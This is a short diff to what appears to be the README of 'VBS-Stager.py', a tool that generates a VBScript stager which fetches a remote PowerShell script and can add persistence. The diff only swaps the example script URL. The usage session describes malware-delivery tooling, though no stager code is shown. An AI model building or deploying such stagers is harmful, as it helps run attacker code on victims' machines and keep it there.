@@ -47,7 +47,7 @@ python3 VBS-Stager.py
                                     /____/             
                                         By @malwarekid
 
-Enter the URL of the PowerShell script: https://raw.githubusercontent.com/malwarekid/test/main/msg.ps1
+Enter the URL of the PowerShell script: https://raw.githubusercontent.com/malwarekid/GoodUSB/master/msg.ps1
 Enter the output file name (default: stager.vbs): 
 Do you want to add persistence to the stager? (yes/no, default: no): yes
 Stager script saved to stager.vbs
